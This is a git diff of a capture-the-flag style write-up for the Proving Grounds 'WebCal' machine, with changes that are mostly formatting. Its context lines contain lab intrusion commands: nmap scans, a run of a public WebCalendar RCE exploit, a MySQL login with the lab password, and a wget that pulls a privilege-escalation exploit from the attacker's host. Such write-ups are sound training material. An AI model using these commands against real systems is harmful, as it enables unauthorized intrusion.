@@ -10,7 +10,7 @@ description: Writeup for WebCal from Offensive Security Proving Grounds (PG)
 
 `nmapAutomator.sh -H 192.168.66.37 -t full`
 
-![](../../.gitbook/assets/3af61e400c594392bd79c8ab1f9fb8d8.png)
+![](<../../.gitbook/assets/3af61e400c594392bd79c8ab1f9fb8d8 (1).png>)
 
 `nmapAutomator.sh -H 192.168.66.37 -t vulns`
 
@@ -38,7 +38,7 @@ The version is v1.2.3
 
 ## Exploit
 
-WebCalendar &lt;= v1.2.4 suffers from an RCE vulnerability: [https://www.exploit-db.com/exploits/18775](https://www.exploit-db.com/exploits/18775)
+WebCalendar <= v1.2.4 suffers from an RCE vulnerability: [https://www.exploit-db.com/exploits/18775](https://www.exploit-db.com/exploits/18775)
 
 Simply running the exploit above gives us RCE. `php 18775.php 192.168.66.37 /webcalendar/`
 
@@ -72,7 +72,7 @@ Furthermore, we now have access to port 3306, which is the MySQL port.
 
 ![](../../.gitbook/assets/724b343fa230482b9c35d9ef90ec297b.png)
 
-```text
+```
 www-data@ucal:/home$ mysql --user=wc --password 
 Enter password: edjfbxMT7KKo2PPC
 ```
@@ -94,4 +94,3 @@ Transfer: `wget "192.168.49.66/mempodipper" -O mempodipper`
 ![](../../.gitbook/assets/389c736476d54a88b1cf246057784dc4.png)
 
 ![](../../.gitbook/assets/d214e7915ef24d1d94ff05ac13f15f04.png)
-
